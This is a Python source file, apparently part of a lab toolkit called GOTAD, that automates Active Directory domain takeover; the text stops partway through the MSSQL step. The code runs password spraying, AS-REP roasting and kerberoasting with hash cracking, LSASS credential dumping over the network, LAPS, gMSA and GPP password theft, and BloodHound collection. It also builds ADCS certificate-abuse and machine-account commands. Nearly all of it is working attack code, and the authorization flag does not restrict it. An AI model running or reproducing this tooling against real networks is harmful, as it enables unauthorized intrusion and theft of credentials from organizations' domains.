#!/usr/bin/env python3
"""GOTAD authorized-lab AD takeover automator (decision engine).

Lab / RoE only. Public tools. Requires --i-am-authorized.

  python3 ad-auto.py --i-am-authorized --dc 192.168.56.11
  python3 ad-auto.py --i-am-authorized --dc 10.10.11.47 --iface tun0 --plan
"""
from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Optional

LOOT = Path(os.environ.get("GOTAD_LOOT", "/loot"))
STATE = LOOT / "auto" / "state.json"
REPORT = LOOT / "auto" / "report.txt"

RE_BANNER = re.compile(
    r"(?P<proto>SMB|LDAP|MSSQL|WINRM|RDP|SSH)\s+"
    r"(?P<ip>\d+\.\d+\.\d+\.\d+)\s+(?P<port>\d+)\s+(?P<name>\S+)\s+"
    r"\[(?P<tag>\*|\+|-)\]\s+(?P<rest>.*)"
)
RE_KV = re.compile(r"\((?P<k>name|domain|signing|SMBv1):(?P<v>[^)]+)\)")
RE_OK = re.compile(
    r"\[\+\]\s+(?P<dom>[^\\\s/]+)[\\/](?P<user>[^\s:]+):(?P<secret>\S+)"
)
RE_PWN = re.compile(r"Pwn3d!", re.I)
RE_ASREP = re.compile(r"\$krb5asrep\$23\$([^@:\s$]+)")
RE_TGS = re.compile(r"\$krb5tgs\$23\$\*([^$\s]+)")
RE_DESC = re.compile(
    r"(?P<user>[A-Za-z0-9._$-]{2,64}).{0,40}description\s*[:=]\s*(?P<desc>\S.+)",
    re.I,
)
RE_LOCK = re.compile(r"Lockout\s*(?:Threshold|threshold)\s*[:=]\s*(?P<n>None|\d+)", re.I)
RE_ESC = re.compile(r"\bESC(?P<n>[1-8])\b")
RE_TMPL = re.compile(r"Template(?: Name)?\s*[:=]\s*(?P<name>\S+)", re.I)
RE_CA = re.compile(r"CA Name\s*[:=]\s*(?P<name>\S.+)", re.I)
RE_EDGE = re.compile(
    r"(?P<right>GenericAll|GenericWrite|WriteDACL|WriteOwner|"
    r"ForceChangePassword|AddMember|AddSelf|WriteProperty)",
    re.I,
)
RE_NTDS = re.compile(
    r"^(?P<user>[^:\s]+):(?P<rid>\d+):(?P<lm>[0-9A-Fa-f]{32}):(?P<nt>[0-9A-Fa-f]{32})",
    re.M,
)
RE_GPP = re.compile(
    r"user(?:name)?\s*[:=]\s*(?P<user>\S+).{0,80}(?:c)?password\s*[:=]\s*(?P<pw>\S+)",
    re.I | re.S,
)
RE_TRUST = re.compile(r"(?:TRUST|trust).{0,40}(?P<name>[A-Za-z0-9.-]+\.[A-Za-z0-9.-]+)")
RE_SAM = re.compile(r"^[A-Za-z0-9._$-]{2,64}$")
NOISE = {
    "smb", "ldap", "mssql", "winrm", "rdp", "ssh", "guest", "administrator",
    "krbtgt", "guest$", "none", "[+]", "[*]", "[-]", "username", "password",
}


@dataclass
class Cred:
    user: str
    password: str = ""
    nthash: str = ""
    role: str = "user"
    source: str = ""


@dataclass
class Host:
    ip: str
    name: str = ""
    domain: str = ""
    proto: str = "SMB"
    signing: Optional[bool] = None
    pwned: bool = False
    role: str = "member"


@dataclass
class Edge:
    right: str
    raw: str


RANK = {"user": 1, "svc": 2, "admin": 3, "da": 4, "ea": 5}


@dataclass
class State:
    domain: str = ""
    dc: str = ""
    dc_fqdn: str = ""
    cidr: str = ""
    ns: str = ""
    iface: str = "eth0"
    profile: str = "auto"
    creds: list = field(default_factory=list)
    path: list = field(default_factory=list)
    hashes: list = field(default_factory=list)
    users: list = field(default_factory=list)
    descriptions: dict = field(default_factory=dict)
    hosts: list = field(default_factory=list)
    edges: list = field(default_factory=list)
    esc: list = field(default_factory=list)
    trusts: list = field(default_factory=list)
    done: list = field(default_factory=list)
    notes: list = field(default_factory=list)
    next_manual: list = field(default_factory=list)
    lockout: Optional[int] = None
    takeover: bool = False
    best: Optional[Cred] = None
    bh_edges: list = field(default_factory=list)
    maq: Optional[int] = None

    def add_cred(self, cred: Cred, hop: str) -> None:
        key = (cred.user.lower(), cred.password, cred.nthash)
        existing = {(c["user"].lower(), c.get("password", ""), c.get("nthash", "")) for c in self.creds}
        if key not in existing:
            self.creds.append(asdict(cred))
        self.note(hop)
        if self.best is None or RANK.get(cred.role, 0) >= RANK.get(self.best.role, 0):
            self.best = cred
        print(f"[loot] {hop}  {cred.user}:{cred.password or cred.nthash}  ({cred.role})")

    def note(self, hop: str) -> None:
        if hop not in self.path:
            self.path.append(hop)

    def mark(self, action: str) -> None:
        if action not in self.done:
            self.done.append(action)

    def has(self, action: str) -> bool:
        return action in self.done

    def add_users(self, names: list[str]) -> int:
        added = 0
        for n in names:
            u = n.strip().strip("\\").split("\\")[-1]
            if not RE_SAM.match(u) or u.lower() in NOISE:
                continue
            if u.endswith("$"):
                continue
            if u not in self.users:
                self.users.append(u)
                added += 1
        return added

    def dump(self) -> None:
        STATE.parent.mkdir(parents=True, exist_ok=True)
        payload = {
            "domain": self.domain,
            "dc": self.dc,
            "dc_fqdn": self.dc_fqdn,
            "cidr": self.cidr,
            "ns": self.ns,
            "iface": self.iface,
            "profile": self.profile,
            "path": self.path,
            "creds": self.creds,
            "hashes": self.hashes,
            "users": self.users,
            "descriptions": self.descriptions,
            "hosts": self.hosts,
            "edges": self.edges,
            "esc": self.esc,
            "trusts": self.trusts,
            "done": self.done,
            "notes": self.notes,
            "next_manual": self.next_manual,
            "lockout": self.lockout,
            "takeover": self.takeover,
            "bh_edges": self.bh_edges,
            "maq": self.maq,
            "best": asdict(self.best) if self.best else None,
        }
        STATE.write_text(json.dumps(payload, indent=2))
        REPORT.write_text(render_report(self))


def which(*names: str) -> Optional[str]:
    for n in names:
        p = shutil.which(n)
        if p:
            return p
    return None


def run(cmd: list[str], timeout: int = 180) -> str:
    print("$ " + " ".join(cmd))
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=False)
    except FileNotFoundError:
        print(f"[!] missing {cmd[0]}")
        return ""
    except subprocess.TimeoutExpired:
        print(f"[!] timeout after {timeout}s")
        return ""
    if p.stdout:
        sys.stdout.write(p.stdout)
    if p.stderr:
        sys.stderr.write(p.stderr)
    return (p.stdout or "") + ("\n" + p.stderr if p.stderr else "")


def parse_banners(blob: str) -> list[Host]:
    hosts: dict[str, Host] = {}
    for m in RE_BANNER.finditer(blob):
        ip = m.group("ip")
        h = hosts.get(ip) or Host(ip=ip, name=m.group("name"), proto=m.group("proto"))
        h.name = m.group("name") or h.name
        h.proto = m.group("proto")
        for kv in RE_KV.finditer(m.group("rest")):
            k, v = kv.group("k"), kv.group("v")
            if k == "domain":
                h.domain = v
            elif k == "name":
                h.name = v
            elif k == "signing":
                h.signing = v.lower() == "true"
        if RE_PWN.search(m.group(0)):
            h.pwned = True
        rest = m.group("rest").lower()
        if "domain controller" in rest or m.group("proto") == "LDAP" and "389" == m.group("port"):
            if "88" in rest or "domain" in rest:
                h.role = "dc"
        if m.group("proto") == "LDAP":
            h.role = "dc"
        if m.group("proto") == "MSSQL":
            h.role = "sql"
        hosts[ip] = h
    return list(hosts.values())


def parse_ok_creds(blob: str) -> list[tuple[str, str, str]]:
    out = []
    for m in RE_OK.finditer(blob):
        out.append((m.group("dom"), m.group("user"), m.group("secret")))
    return out


def parse_users_loose(blob: str) -> list[str]:
    found = []
    for line in blob.splitlines():
        line = line.strip()
        if not line or line.startswith("[") or line.startswith("$") or line.startswith("#"):
            continue
        # nxc user tables often: "username                  "
        tok = re.split(r"\s{2,}|\t", line)[0].strip()
        tok = tok.split("\\")[-1]
        if RE_SAM.match(tok):
            found.append(tok)
    return found


def parse_descriptions(blob: str) -> dict[str, str]:
    d = {}
    for m in RE_DESC.finditer(blob):
        d[m.group("user")] = m.group("desc").strip().strip("'\"")
    return d


def parse_lockout(blob: str) -> Optional[int]:
    m = RE_LOCK.search(blob)
    if not m:
        return None
    return None if m.group("n").lower() == "none" else int(m.group("n"))


def guess_cidr(ip: str) -> str:
    parts = ip.split(".")
    if len(parts) == 4:
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    return ip


def detect_profile(domain: str, flag: str) -> str:
    if flag in {"goad", "generic"}:
        return flag
    blob = domain.lower()
    if "sevenkingdoms" in blob or "essos" in blob or "goad" in blob:
        return "goad"
    return "generic"


def users_file(st: State) -> Path:
    p = LOOT / "enum" / "users.txt"
    p.parent.mkdir(parents=True, exist_ok=True)
    if st.users:
        p.write_text("\n".join(st.users) + "\n")
    return p


def auth_args(st: State) -> list[str]:
    if not st.best:
        return []
    if st.best.nthash and not st.best.password:
        return ["-u", st.best.user, "-H", st.best.nthash]
    return ["-u", st.best.user, "-p", st.best.password]


def goad_wordlist() -> Path:
    for c in (
        Path("/opt/gotad/conf/wordlist-lab.txt"),
        Path(__file__).resolve().parent.parent / "conf" / "wordlist-lab.txt",
    ):
        if c.exists():
            return c
    p = LOOT / "auto" / "goad-lab.txt"
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(
        "hodor\niseedealpeople\niseedeadpeople\nWinter2022\niknownothing\n"
        "Heartsbane\nNeedle\n_L0ngCl@w_\nFightP3aceAndHonor!\nsexywolfy\n"
        "fr3edom\nhorse\nBurnThemAll!\nWelcome1\n"
    )
    return p


def wordlists(profile: str) -> list[Path]:
    out = []
    if profile == "goad":
        out.append(goad_wordlist())
    out.append(LOOT / "auto" / "lab.txt")
    out.append(Path("/usr/share/wordlists/rockyou.txt"))
    return [p for p in out if p.exists() or p == goad_wordlist()]


_HASHCAT_USABLE: Optional[bool] = None


def hashcat_usable(hc: str) -> bool:
    """True only if hashcat has a working compute backend.

    Headless Kali VMs/containers ship hashcat but no OpenCL/CUDA runtime, so it
    dies with 'No OpenCL, HIP or CUDA compatible platform found'. Probe once and
    cache, so we skip hashcat and go straight to john instead of eating a
    240s timeout per wordlist.
    """
    global _HASHCAT_USABLE
    if _HASHCAT_USABLE is not None:
        return _HASHCAT_USABLE
    info = run([hc, "-I"], timeout=20).lower()
    bad = ("no devices found" in info or "no opencl" in info
           or "no backend" in info or "not compatible platform" in info)
    _HASHCAT_USABLE = bool(info) and not bad
    if not _HASHCAT_USABLE:
        print("[*] hashcat has no compute backend (VM/no GPU) -> using john")
    return _HASHCAT_USABLE


def crack(mode: str, hashfile: Path, profile: str) -> dict[str, str]:
    if not hashfile.exists() or hashfile.stat().st_size == 0:
        return {}
    text = hashfile.read_text(errors="ignore")
    users_by_hash = {}
    for line in text.splitlines():
        u = None
        if mode == "18200":
            m = RE_ASREP.search(line)
            u = m.group(1) if m else None
        elif mode == "13100":
            m = RE_TGS.search(line)
            u = m.group(1) if m else None
        if u:
            users_by_hash[line.strip()] = u

    cracked: dict[str, str] = {}
    hc = which("hashcat")
    pot = LOOT / "auto" / f"pot_{mode}.txt"
    if hc and hashcat_usable(hc):
        for wl in wordlists(profile):
            if not wl.exists():
                continue
            run(
                [
                    hc, "-m", mode, str(hashfile), str(wl),
                    "--quiet", "--potfile-path", str(pot),
                    "--outfile", str(pot), "--outfile-format", "3",
                ],
                timeout=240,
            )
            if pot.exists():
                for line in pot.read_text(errors="ignore").splitlines():
                    if ":" not in line:
                        continue
                    h, pw = line.rsplit(":", 1)
                    user = users_by_hash.get(h)
                    if not user:
                        m = RE_ASREP.search(h) or RE_TGS.search(h)
                        user = m.group(1) if m else h[:24]
                    cracked[user] = pw
            if cracked:
                return cracked

    john = which("john")
    if john:
        fmt = "krb5asrep" if mode == "18200" else "krb5tgs"
        for wl in wordlists(profile):
            if not wl.exists():
                continue
            run([john, f"--format={fmt}", f"--wordlist={wl}", str(hashfile)], timeout=180)
            shown = run([john, "--show", f"--format={fmt}", str(hashfile)], timeout=30)
            for line in shown.splitlines():
                if ":" in line:
                    left, pw = line.split(":", 1)
                    user = left.split("$")[-1].split("@")[0] or left
                    cracked[user] = pw.split(":")[0]
            if cracked:
                return cracked
    return cracked


def merge_hosts(st: State, hosts: list[Host]) -> None:
    by_ip = {h["ip"]: h for h in st.hosts}
    for h in hosts:
        rec = asdict(h)
        old = by_ip.get(h.ip, {})
        old.update({k: v for k, v in rec.items() if v not in (None, "", False) or k == "signing"})
        if h.pwned:
            old["pwned"] = True
        by_ip[h.ip] = old
    st.hosts = list(by_ip.values())
    for h in st.hosts:
        if h.get("domain") and not st.domain:
            st.domain = h["domain"]
        if h.get("role") == "dc" and h.get("name") and not st.dc_fqdn:
            dom = h.get("domain") or st.domain
            st.dc_fqdn = f"{h['name'].lower()}.{dom}" if dom else h["name"].lower()


def ingest_ok(st: State, blob: str, hop: str, role: str = "user") -> None:
    for _dom, user, secret in parse_ok_creds(blob):
        if re.fullmatch(r"[0-9a-fA-F]{32}", secret):
            st.add_cred(Cred(user, nthash=secret, role=role, source=hop), hop)
        else:
            st.add_cred(Cred(user, password=secret, role=role, source=hop), hop)


def apply_bh_next(st: State) -> None:
    here = str(Path(__file__).resolve().parent)
    if here not in sys.path:
        sys.path.insert(0, here)
    try:
        import bh_next
    except ImportError:
        print("[*] bh-next.py not importable")
        return
    objects = bh_next.load_zip(LOOT / "bloodhound")
    if not objects:
        print("[*] no BloodHound zip yet")
        return
    names = [c["user"] for c in st.creds if c.get("user")]
    owned = bh_next.owned_sids(objects, names)
    edges = bh_next.find_edges(objects, owned)
    st.bh_edges = edges[:30]
    print(bh_next.render(edges, 15))
    for e in edges[:8]:
        st.next_manual.append(f"BH {e['src']} --{e['right']}--> {e['dst']}: {e['abuse']}")


# ── actions ──────────────────────────────────────────────────────────


def act_box(st: State) -> bool:
    LOOT.mkdir(parents=True, exist_ok=True)
    for d in ("nmap", "hashes", "bloodhound", "tickets", "adcs", "enum", "auto"):
        (LOOT / d).mkdir(parents=True, exist_ok=True)
    ping = run(["ping", "-c", "1", "-W", "2", st.dc], timeout=8)
    ntp = which("ntpdate")
    if ntp:
        run([ntp, "-u", st.dc], timeout=15)
    nxc = which("nxc", "netexec")
    blob = ""
    if nxc:
        blob += run([nxc, "smb", st.dc], timeout=30)
        blob += run([nxc, "ldap", st.dc], timeout=30)
    merge_hosts(st, parse_banners(blob))
    if not st.domain:
        for h in st.hosts:
            if h.get("domain"):
                st.domain = h["domain"]
                break
    if not st.cidr:
        st.cidr = guess_cidr(st.dc)
    if not st.ns:
        st.ns = st.dc
    if not st.dc_fqdn:
        st.dc_fqdn = st.domain or st.dc
    st.profile = detect_profile(st.domain, st.profile)
    line = f"{st.dc}  {st.domain} {st.dc_fqdn}\n"
    hosts = Path("/etc/hosts")
    try:
        cur = hosts.read_text() if hosts.exists() else ""
        if st.dc_fqdn and st.dc_fqdn not in cur:
            hosts.write_text(cur + line)
    except OSError:
        st.notes.append("could not write /etc/hosts")
    if "1 received" in ping or "bytes from" in ping or st.hosts:
        st.note("attack box ready")
        st.mark("box")
        return True
    print("[!] DC not reachable — wrong VPN / parent NIC")
    st.next_manual.append("Fix L2/VPN. nxc smb must see the DC before anything else.")
    st.mark("box")
    return False


def act_recon(st: State) -> bool:
    nxc = which("nxc", "netexec")
    if not nxc:
        print("[!] nxc missing")
        st.mark("recon")
        return False
    blob = ""
    blob += run([nxc, "smb", st.cidr, "--gen-relay-list", str(LOOT / "enum" / "relay.txt")], timeout=180)
    blob += run([nxc, "ldap", st.cidr], timeout=90)
    blob += run([nxc, "mssql", st.cidr], timeout=90)
    blob += run([nxc, "winrm", st.cidr], timeout=90)
    merge_hosts(st, parse_banners(blob))
    roles = {h.get("role") for h in st.hosts}
    print(f"[*] hosts={len(st.hosts)} roles={sorted(r for r in roles if r)}")
    if any(h.get("signing") is False for h in st.hosts):
        st.next_manual.append("SMB signing off on a member — ntlmrelayx is in play (manual).")
    st.note("recon sweep")
    st.mark("recon")
    return bool(st.hosts)


def act_unauth(st: State) -> bool:
    nxc = which("nxc", "netexec")
    blob = ""
    if nxc:
        blob += run([nxc, "smb", st.dc, "-u", "", "-p", "", "--users", "--shares"], timeout=60)
        blob += run([nxc, "ldap", st.dc, "-u", "", "-p", "", "--users", "--active-users"], timeout=60)
        blob += run([nxc, "smb", st.dc, "-u", "guest", "-p", "", "--shares"], timeout=30)
    sid = which("impacket-lookupsid", "lookupsid.py")
    if sid:
        blob += run([sid, f"{st.domain or 'UNKNOWN'}/nobody@{st.dc}", "-no-pass"], timeout=90)
        rids = re.findall(r"\d+:\s+([A-Za-z0-9._$-]+)\s+\(", blob)
        st.add_users(rids)
    enum = which("enum4linux-ng")
    if enum:
        blob += run([enum, "-A", st.dc], timeout=120)
    nxc2 = which("nxc", "netexec")
    if nxc2:
        run([nxc2, "smb", st.dc, "--timeroasting", str(LOOT / "hashes" / "timeroast.txt")], timeout=60)
    added = st.add_users(parse_users_loose(blob))
    descs = parse_descriptions(blob)
    st.descriptions.update(descs)
    users_file(st)
    print(f"[*] users={len(st.users)} descriptions={len(st.descriptions)} (+{added})")
    if st.users:
        st.note("user list")
    else:
        st.notes.append("no anonymous users")
    st.mark("unauth")
    return bool(st.users)


def act_asrep(st: State) -> bool:
    nxc = which("nxc", "netexec")
    outf = LOOT / "hashes" / "asrep.txt"
    blob = ""
    if nxc:
        args = [nxc, "ldap", st.dc, "-u", "", "-p", "", "--asreproast", str(outf)]
        if st.best:
            args = [nxc, "ldap", st.dc, *auth_args(st), "--asreproast", str(outf)]
        blob += run(args, timeout=90)
    gnu = which("impacket-GetNPUsers", "GetNPUsers.py")
    uf = users_file(st)
    if gnu and uf.exists() and uf.stat().st_size:
        blob += run(
            [
                gnu, f"{st.domain}/", "-no-pass", "-dc-ip", st.dc,
                "-usersfile", str(uf), "-format", "hashcat", "-outputfile", str(outf),
            ],
            timeout=90,
        )
    names = RE_ASREP.findall(blob)
    if outf.exists():
        names += RE_ASREP.findall(outf.read_text(errors="ignore"))
    names = list(dict.fromkeys(names))
    if names:
        st.hashes.append("asrep:" + ",".join(names))
    cracked = crack("18200", outf, st.profile)
    progressed = False
    for user, pw in cracked.items():
        st.add_cred(Cred(user, password=pw, role="user", source="asrep"), f"AS-REP {user}")
        progressed = True
    if names and not cracked:
        print(f"[*] AS-REP hashes for {names} — did not crack")
        st.next_manual.append(f"Crack 18200: {outf}")
    st.mark("asrep")
    return progressed


def act_spray(st: State) -> bool:
    nxc = which("nxc", "netexec")
    if not nxc:
        st.mark("spray")
        return False
    pol = run([nxc, "smb", st.dc, "--pass-pol"], timeout=30)
    lock = parse_lockout(pol)
    if lock is not None:
        st.lockout = lock
    uf = users_file(st)
    if not uf.exists() or uf.stat().st_size == 0:
        print("[*] no users.txt — skip spray")
        st.mark("spray")
        return False
    cap = 2 if st.lockout and st.lockout > 0 else 4
    print(f"[*] lockout={st.lockout} cap={cap} guesses")
    progressed = False
    blob = run(
        [nxc, "smb", st.dc, "-u", str(uf), "-p", str(uf),
         "--no-bruteforce", "--continue-on-success"],
        timeout=180,
    )
    before = len(st.creds)
    ingest_ok(st, blob, "spray user=pass")
    progressed = len(st.creds) > before

    if st.descriptions:
        df = LOOT / "auto" / "desc-pass.txt"
        df.write_text("\n".join(st.descriptions.values()) + "\n")
        blob = run(
            [nxc, "smb", st.dc, "-u", str(uf), "-p", str(df),
             "--no-bruteforce", "--continue-on-success"],
            timeout=180,
        )
        ingest_ok(st, blob, "spray description")
        for user, desc in st.descriptions.items():
            if any(c["user"] == user for c in st.creds):
                continue
            # try the owner of the description as that password
            probe = run(
                [nxc, "smb", st.dc, "-u", user, "-p", desc, "--continue-on-success"],
                timeout=20,
            )
            ingest_ok(st, probe, f"description {user}")

    if not st.best:
        seasons = ["Welcome1", "Summer2024", "Winter2025", "Spring2026", "Winter2022", "Password1"]
        sf = LOOT / "auto" / "seasons.txt"
        sf.write_text("\n".join(seasons[:cap]) + "\n")
        blob = run(
            [nxc, "smb", st.dc, "-u", str(uf), "-p", str(sf),
             "--no-bruteforce", "--continue-on-success"],
            timeout=180,
        )
        ingest_ok(st, blob, "season spray")

    if st.best:
        st.note("valid domain cred")
        progressed = True
    st.mark("spray")
    return progressed


def act_kerberoast(st: State) -> bool:
    if not st.best:
        st.mark("kerberoast")
        return False
    nxc = which("nxc", "netexec")
    outf = LOOT / "hashes" / "kerb.txt"
    blob = ""
    if nxc:
        blob += run([nxc, "ldap", st.dc, *auth_args(st), "--kerberoasting", str(outf)], timeout=120)
    gspn = which("impacket-GetUserSPNs", "GetUserSPNs.py")
    if gspn and st.best.password:
        blob += run(
            [
                gspn, f"{st.domain}/{st.best.user}:{st.best.password}",
                "-dc-ip", st.dc, "-request", "-outputfile", str(outf),
            ],
            timeout=120,
        )
    names = RE_TGS.findall(blob)
    if outf.exists():
        names += RE_TGS.findall(outf.read_text(errors="ignore"))
    names = list(dict.fromkeys(names))
    if names:
        st.hashes.append("kerberoast:" + ",".join(names))
    cracked = crack("13100", outf, st.profile)
    progressed = False
    for user, pw in cracked.items():
        st.add_cred(Cred(user, password=pw, role="svc", source="kerberoast"), f"kerberoast {user}")
        progressed = True
    if names and not cracked:
        st.next_manual.append(f"Crack 13100: {outf}  ({', '.join(names)})")
    st.mark("kerberoast")
    return progressed


def act_bloodhound(st: State) -> bool:
    if not st.best or not st.best.password:
        print("[*] need a cleartext cred for BloodHound")
        st.mark("bloodhound")
        return False
    bh = which("bloodhound-python", "bloodhound.py")
    rust = which("rusthound-ce", "rusthound")
    if rust:
        run(
            [rust, "-d", st.domain, "-u", f"{st.best.user}@{st.domain}", "-p", st.best.password,
             "-z", "-o", str(LOOT / "bloodhound"), "-f", st.dc],
            timeout=300,
        )
    elif bh:
        run(
            [
                bh, "-u", st.best.user, "-p", st.best.password, "-d", st.domain,
                "-dc", st.dc_fqdn, "-ns", st.ns, "-c", "All", "--zip",
                "-o", str(LOOT / "bloodhound"),
            ],
            timeout=300,
        )
    nxc = which("nxc", "netexec")
    if nxc:
        blob = run(
            [nxc, "ldap", st.dc, *auth_args(st), "--users", "--groups", "--computers", "--trusts"],
            timeout=120,
        )
        st.add_users(parse_users_loose(blob))
        st.descriptions.update(parse_descriptions(blob))
        for m in RE_TRUST.finditer(blob):
            t = m.group("name")
            if t not in st.trusts:
                st.trusts.append(t)
    users_file(st)
    apply_bh_next(st)
    st.note("BloodHound collect")
    st.mark("bloodhound")
    return True


def act_lateral(st: State) -> bool:
    if not st.best:
        st.mark("lateral")
        return False
    nxc = which("nxc", "netexec")
    if not nxc:
        st.mark("lateral")
        return False
    blob = run(
        [nxc, "smb", st.cidr, *auth_args(st), "--continue-on-success",
         "--shares", "--sessions", "--loggedon-users"],
        timeout=180,
    )
    merge_hosts(st, parse_banners(blob))
    ingest_ok(st, blob, "lateral")
    progressed = False
    if RE_PWN.search(blob):
        st.note("local admin")
        progressed = True
        if st.best and st.best.role in {"user", "svc"}:
            st.best.role = "admin"
        dump = run([nxc, "smb", st.cidr, *auth_args(st), "-M", "lsassy"], timeout=180)
        ingest_ok(st, dump, "lsassy", role="admin")
        for m in RE_NTDS.finditer(dump):
            user, nt = m.group("user"), m.group("nt")
            if user.lower() in {"guest", "defaultaccount"}:
                continue
            role = "da" if user.lower() in {"administrator", "krbtgt"} or "admin" in user.lower() else "admin"
            st.add_cred(Cred(user.split("\\")[-1], nthash=nt, role=role, source="lsassy"), f"lsassy {user}")
            progressed = True
    st.mark("lateral")
    return progressed


def act_acl(st: State) -> bool:
    if not st.best or not st.best.password:
        st.mark("acl")
        return False
    bad = which("bloodyAD")
    if not bad:
        st.mark("acl")
        return False
    blob = run(
        [bad, "--host", st.dc, "-d", st.domain, "-u", st.best.user, "-p", st.best.password, "get", "writable"],
        timeout=90,
    )
    for line in blob.splitlines():
        if RE_EDGE.search(line):
            right = RE_EDGE.search(line).group("right")
            st.edges.append({"right": right, "raw": line.strip()})
    if st.edges:
        st.note(f"{len(st.edges)} writable ACL(s)")
        print("[*] ACL edges:")
        for e in st.edges[:12]:
            print(f"    {e['right']}: {e['raw'][:140]}")
        st.next_manual.append("Review bloodyAD writable. Abuse with --abuse or commands.md §ACL.")
    st.mark("acl")
    return bool(st.edges)


def act_delegation(st: State) -> bool:
    if not st.best or not st.best.password:
        st.mark("delegation")
        return False
    fd = which("impacket-findDelegation", "findDelegation.py")
    if not fd:
        st.mark("delegation")
        return False
    blob = run([fd, f"{st.domain}/{st.best.user}:{st.best.password}", "-dc-ip", st.dc], timeout=90)
    if re.search(r"Unconstrained|Constrained|Resource-Based", blob, re.I):
        st.note("delegation present")
        st.next_manual.append("Delegation hit — coerce / getST / RBCD. See commands.md.")
        st.mark("delegation")
        return True
    st.mark("delegation")
    return False


def act_adcs(st: State) -> bool:
    if not st.best or not st.best.password:
        st.mark("adcs")
        return False
    cert = which("certipy", "certipy-ad")
    if not cert:
        st.mark("adcs")
        return False
    blob = run(
        [cert, "find", "-u", f"{st.best.user}@{st.domain}", "-p", st.best.password,
         "-dc-ip", st.dc, "-vulnerable", "-stdout"],
        timeout=120,
    )
    if re.search(r"could not|no ca|no certificate", blob, re.I) and "ESC" not in blob.upper():
        print("[*] no CA / no ESC — skip ADCS")
        st.mark("adcs")
        return False
    for n in RE_ESC.findall(blob):
        if n not in st.esc:
            st.esc.append(n)
    tmpls = RE_TMPL.findall(blob)
    cas = RE_CA.findall(blob)
    if st.esc:
        st.note("ADCS ESC" + ",".join(st.esc))
        st.next_manual.append(
            f"certipy req -u {st.best.user}@{st.domain} -p '{st.best.password}' "
            f"-dc-ip {st.dc} -ca '{(cas[0] if cas else 'CA')}' "
            f"-template '{(tmpls[0] if tmpls else 'ESC1')}' -upn administrator@{st.domain}"
        )
    st.mark("adcs")
    return bool(st.esc)


def act_sysvol(st: State) -> bool:
    if not st.best:
        st.mark("sysvol")
        return False
    nxc = which("nxc", "netexec")
    blob = ""
    if nxc:
        blob += run([nxc, "smb", st.dc, *auth_args(st), "--spider", "SYSVOL", "--pattern", ".xml"], timeout=90)
        blob += run([nxc, "smb", st.dc, *auth_args(st), "-M", "gpp_password", "-M", "gpp_autologin"], timeout=90)
        blob += run([nxc, "ldap", st.dc, *auth_args(st), "-M", "laps"], timeout=60)
    gpp = which("impacket-Get-GPPPassword", "Get-GPPPassword.py")
    if gpp and st.best.password:
        blob += run([gpp, f"{st.domain}/{st.best.user}:{st.best.password}@{st.dc}"], timeout=60)
    progressed = False
    for m in RE_GPP.finditer(blob):
        st.add_cred(
            Cred(m.group("user"), password=m.group("pw"), role="admin", source="gpp"),
            f"GPP {m.group('user')}",
        )
        progressed = True
    ingest_ok(st, blob, "sysvol")
    st.mark("sysvol")
    return progressed


def act_laps(st: State) -> bool:
    if not st.best or not st.best.password:
        st.mark("laps")
        return False
    bad = which("bloodyAD")
    blob = ""
    if bad:
        blob += run(
            [bad, "--host", st.dc, "-d", st.domain, "-u", st.best.user, "-p", st.best.password,
             "get", "search", "--filter", "(ms-Mcs-AdmPwd=*)", "--attr", "dNSHostName,ms-Mcs-AdmPwd"],
            timeout=60,
        )
        blob += run(
            [bad, "--host", st.dc, "-d", st.domain, "-u", st.best.user, "-p", st.best.password,
             "get", "search", "--filter", "(msLAPS-Password=*)", "--attr", "dNSHostName,msLAPS-Password"],
            timeout=60,
        )
        blob += run(
            [bad, "--host", st.dc, "-d", st.domain, "-u", st.best.user, "-p", st.best.password,
             "get", "search", "--filter", "(objectClass=msDS-GroupManagedServiceAccount)",
             "--attr", "sAMAccountName"],
            timeout=60,
        )
    nxc = which("nxc", "netexec")
    if nxc:
        blob += run([nxc, "ldap", st.dc, *auth_args(st), "-M", "laps"], timeout=60)
        blob += run([nxc, "ldap", st.dc, *auth_args(st), "-M", "gmsa"], timeout=60)
    progressed = False
    for m in RE_GPP.finditer(blob):
        st.add_cred(Cred(m.group("user"), password=m.group("pw"), role="admin", source="laps"), f"LAPS {m.group('user')}")
        progressed = True
    ingest_ok(st, blob, "laps", role="admin")
    if re.search(r"ms-Mcs-AdmPwd|msLAPS-Password|msDS-ManagedPassword", blob, re.I):
        st.note("LAPS/gMSA readable")
        st.next_manual.append("PTH the LAPS/gMSA hash — see tools/gpo.md")
        progressed = True
    st.mark("laps")
    return progressed


def act_maq(st: State) -> bool:
    if not st.best or not st.best.password:
        st.mark("maq")
        return False
    bad = which("bloodyAD")
    blob = ""
    if bad:
        blob = run(
            [bad, "--host", st.dc, "-d", st.domain, "-u", st.best.user, "-p", st.best.password,
             "get", "object", ".", "--attr", "ms-DS-MachineAccountQuota"],
            timeout=40,
        )
    m = re.search(r"ms-DS-MachineAccountQuota\s*[:=]\s*(\d+)", blob, re.I)
    if m:
        st.maq = int(m.group(1))
        print(f"[*] MachineAccountQuota={st.maq}")
    if st.maq == 0:
        print("[*] MAQ 0 — need an existing computer you write")
        st.mark("maq")
        return False
    if st.maq is None:
        st.maq = 10
        print("[*] MAQ unknown — assuming default 10")
    st.note(f"MAQ {st.maq}")
    st.next_manual.append(
        f"impacket-addcomputer {st.domain}/{st.best.user}:'{st.best.password}' "
        f"-computer-name 'FAKE$' -computer-pass 'LabOnly!1' -dc-ip {st.dc}"
    )
    st.mark("maq")
    return st.maq > 0


def act_mssql(st: State) -> bool:
    if not st.best:
        st.mark("mssql")
        return False
    if not any(h.get("role") == "sql" or h.get("proto") == "MSSQL" for h in st.hosts):
        print("[*] no MSSQL in recon — skip")
        st.mark("mssql")
        return False
    nxc = which("nxc", "netexec")
    if not nxc:
        st.mark("mssql")
        return False
    blob = run([nxc, "mssql", st.cidr, *auth_args(st)], timeout=90)
    ingest_ok(st, blob, "mssql", role="svc")
    if RE_PWN.search(blob) or parse_ok_creds(blob):
        st.note("MSSQL login")
        hop = Path(__file__).resolve().parent / "mssql-hop.py"
        sql_hosts = [h.get("ip") for h in st.hosts if h.get("role") == "sql" or h.get("proto") == "MSSQL"]
        if hop.exists() and sql_hosts and st.best.password:
            run(
                [sys.executable, str(hop), "--i-am-authorized",
                 "--host", sql_hosts[0], "--domain", st.domain,
